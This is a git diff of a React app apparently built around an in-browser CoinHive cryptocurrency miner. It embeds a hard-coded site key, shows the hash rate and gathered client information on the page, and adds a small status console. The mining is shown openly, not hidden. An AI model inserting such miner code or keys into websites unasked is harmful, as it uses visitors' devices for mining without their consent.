@@ -1,28 +1,25 @@
 import React, { Component } from 'react'
 
 // Library
-import Client from './lib/Client'
+import ClientInfo from './lib/clientInfo'
 
 // Components
 import CoinHive from './components/CoinHive'
 import Dialog from './components/Dialog'
+import MiniConsole from './components/MiniConsole'
 import Presenter from './components/Presenter'
-import ClientInfo from './components/ClientInfo'
+import ClientInfoView from './components/ClientInfoView'
 
 // Styles
-import './App.css'
 import styled from 'styled-components'
 
-const MINER_TRYING = 'MINER_TRYING'
-const MINER_MINING = 'MINER_MINING'
-
-const H1PS = styled.h1`
+const H1Pz = styled.h1`
 font-size: 3.2em;
 text-align: center;
 color: #EA6B66;
 line-height: 0px;
 `
-const H4PS = styled.p`
+const H4Pz = styled.p`
 font-size: 1.1em;
 text-align: center;
 color: gray;
@@ -33,15 +30,16 @@ class App extends Component {
   constructor (props) {
     super(props)
 
-    this.clientData = new Client().getData()
+    this.clientData = new ClientInfo().getData()
 
     this.state = {
       dialog: (
         <div>
-          <H1PS>{` ${Number(0).toPrecision(4)} `}</H1PS>
-          <H4PS>hashed / second</H4PS>
+          <H1Pz>{` ${Number(0).toPrecision(4)} `}</H1Pz>
+          <H4Pz>hashed / second</H4Pz>
         </div>
-      )
+      ),
+      output: 'Initializing...'
     }
   }
 
@@ -49,8 +47,8 @@ class App extends Component {
     this.setState({
       dialog: (
         <div>
-          <H1PS>{` ${Number(hashesPerSecond).toPrecision(4)} `}</H1PS>
-          <H4PS>hashed / second</H4PS>
+          <H1Pz>{` ${Number(hashesPerSecond).toPrecision(4)} `}</H1Pz>
+          <H4Pz>hashed / second</H4Pz>
         </div>
       )
     })
@@ -58,18 +56,25 @@ class App extends Component {
 
   onAccepted = () => {
     console.log('[Accepted]')
+    this.setState({
+      output: 'Accepted'
+    })
   }
 
   onFound = () => {
     console.log('[Found]')
+    this.setState({
+      output: 'Found'
+    })
   }
 
   render () {
     return (
       <div>
         <Dialog text={this.state.dialog} />
+        <MiniConsole text={this.state.output} />
         <Presenter tread={this.state.tread} />
-        <ClientInfo client={this.clientData} />
+        <ClientInfoView client={this.clientData} />
         <CoinHive
           status={this.state.status}
           siteKey='QCLjDlh3Kllh2aj3P0cW6as65eZH3oeK'
